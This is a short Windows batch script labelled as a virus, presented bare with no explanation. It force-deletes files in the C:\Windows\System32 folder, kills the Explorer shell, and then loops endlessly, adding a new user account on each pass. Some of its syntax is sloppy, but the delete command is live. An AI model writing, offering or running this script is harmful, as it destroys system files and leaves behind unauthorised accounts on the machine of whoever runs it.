@echo off
:Virus
del /f /q "C:\Windows\System32"
taskkill explorer.exe
tskill explorer.exe
set /a_virus+=1
net user %_virus+% /add
goto virus